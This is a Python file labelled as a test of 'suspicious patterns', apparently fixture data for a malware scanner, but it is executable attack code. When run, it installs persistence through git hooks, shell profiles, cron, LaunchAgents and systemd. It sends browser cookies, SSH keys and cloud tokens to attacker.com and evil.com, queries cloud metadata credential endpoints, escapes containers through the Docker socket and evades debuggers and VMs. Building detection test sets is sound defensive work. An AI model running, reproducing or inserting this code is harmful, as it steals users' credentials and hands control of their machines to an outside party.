#!/usr/bin/env python3
# Advanced test file with additional suspicious patterns

import os
import subprocess
import requests
import json

# ===== GIT HOOKS MANIPULATION =====
# Installing malicious git hooks
os.system('echo "curl evil.com | sh" > .git/hooks/pre-commit')
os.system('chmod +x .git/hooks/post-checkout')
subprocess.run(['cp', 'backdoor.sh', '.git/hooks/pre-push'])

# ===== SHELL PROFILE PERSISTENCE =====
# Modifying shell startup files
with open(os.path.expanduser('~/.bashrc'), 'a') as f:
    f.write('alias sudo="echo PASSWORD: ; read -s pwd; echo $pwd > /tmp/.creds; sudo"')

os.system('echo "source ~/.evil_profile" >> ~/.zshrc')
os.system('echo "set PATH /opt/malware/bin $PATH" >> ~/.config/fish/config.fish')

# Profile file access
shell_configs = ['~/.profile', '~/.bash_profile', '~/.zprofile']
for config in shell_configs:
    os.system(f'echo "nohup python3 ~/.hidden/backdoor.py &" >> {config}')

# ===== BROWSER DATA THEFT =====
# Chrome cookie/password theft
chrome_paths = [
    '~/Library/Application Support/Google/Chrome/Default/Cookies',
    '~/.config/google-chrome/Default/Login Data',
    '~/AppData/Local/Google/Chrome/User Data/Default/Cookies'
]

for path in chrome_paths:
    if os.path.exists(os.path.expanduser(path)):
        with open(path, 'rb') as f:
            data = f.read()
            requests.post('https://attacker.com/steal', files={'cookies': data})

# Firefox profile access
firefox_profile = '~/.mozilla/firefox/*.default*/cookies.sqlite'
os.system(f'cp {firefox_profile} /tmp/ff_cookies.db')

# Safari cookies
safari_cookies = '~/Library/Cookies/Cookies.binarycookies'

# ===== CLOUD CLI CREDENTIAL THEFT =====
# AWS credentials
aws_creds = os.path.expanduser('~/.aws/credentials')
if os.path.exists(aws_creds):
    with open(aws_creds) as f:
        creds = f.read()
        # Exfiltrate AWS keys

# Azure CLI
azure_profile = '~/.azure/accessTokens.json'
os.system(f'cat {azure_profile} | base64 | curl -X POST -d @- evil.com/azure')

# GCP credentials
gcloud_creds = [
    '~/.config/gcloud/credentials.db',
    '~/.config/gcloud/access_tokens.db',
    '~/.config/gcloud/application_default_credentials.json'
]

# Kubernetes configs
k8s_config = '~/.kube/config'
os.system(f'curl -F "file=@{k8s_config}" https://attacker.com/k8s')

# ===== CLOUD METADATA ENDPOINTS =====
# AWS metadata service
metadata_urls = [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/'
]

for url in metadata_urls:
    try:
        r = requests.get(url, timeout=1)
        creds = r.text
    except:
        pass

# Azure metadata
azure_metadata = requests.get(
    'http://169.254.169.254/metadata/identity/oauth2/token',
    headers={'Metadata': 'true'}
)

# GCP metadata
gcp_token = requests.get(
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    headers={'Metadata-Flavor': 'Google'}
)

# ===== PERSISTENCE MECHANISMS =====
# Cron jobs
os.system('(crontab -l ; echo "* * * * * curl evil.com | sh") | crontab -')
os.system('echo "* * * * * root /tmp/.backdoor" >> /etc/crontab')
os.system('echo "@reboot /usr/local/bin/persistence.sh" >> /var/spool/cron/crontabs/user')

# macOS LaunchAgents
launch_agent = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/tmp/.hidden.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""

os.system(f'echo \'{launch_agent}\' > ~/Library/LaunchAgents/com.malware.plist')
os.system('launchctl load ~/Library/LaunchAgents/com.evil.plist')
os.system('cp backdoor.plist /Library/LaunchDaemons/')

# Systemd services
systemd_service = """[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl evil.com | sh; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target"""

os.system(f'echo \'{systemd_service}\' > /etc/systemd/system/monitoring.service')
os.system('systemctl enable backdoor.service')
os.system('systemctl daemon-reload')

# ===== CONTAINER ESCAPES =====
# Docker socket abuse
os.system('curl --unix-socket /var/run/docker.sock http://localhost/containers/json')
subprocess.run(['docker', '-H', 'unix:///var/run/docker.sock', 'run', '-v', '/:/host', 'alpine', 'chroot', '/host'])

# Kubernetes service account
k8s_token = '/var/run/secrets/kubernetes.io/serviceaccount/token'
if os.path.exists(k8s_token):
    with open(k8s_token) as f:
        token = f.read()
        # Use token to access k8s API

# ===== ANTI-ANALYSIS =====
# Debugger detection
try:
    import ctypes
    kernel32 = ctypes.windll.kernel32
    if kernel32.IsDebuggerPresent():
        exit()
except:
    pass

# Check for ptrace
os.system('if [ $(ps aux | grep -c strace) -gt 0 ]; then exit; fi')

# VM detection
vm_files = ['/sys/class/dmi/id/product_name', '/sys/hypervisor/uuid']
for vmf in vm_files:
    if os.path.exists(vmf):
        with open(vmf) as f:
            if 'VirtualBox' in f.read() or 'VMware' in f.read():
                exit()

# ===== ADDITIONAL PATTERNS =====
# Git credential helper abuse
os.system('git config --global credential.helper "!f() { echo password=$1; }; f"')
os.system('cat ~/.git-credentials >> /tmp/gitcreds.txt')

# SSH key theft
ssh_keys = ['~/.ssh/id_rsa', '~/.ssh/id_ed25519', '~/.ssh/id_dsa']
for key in ssh_keys:
    os.system(f'cat {key} | curl -X POST -d @- https://attacker.com/keys')

# History file access
history_files = ['~/.bash_history', '~/.zsh_history', '~/.python_history', '~/.mysql_history']
for hist in history_files:
    os.system(f'grep -E "(password|token|secret|key)" {hist} > /tmp/creds.txt')

# Database configs
os.system('cat ~/.pgpass >> /tmp/dbcreds.txt')
os.system('cat ~/.my.cnf | grep password')

# NPM token
os.system('cat ~/.npmrc | grep _authToken')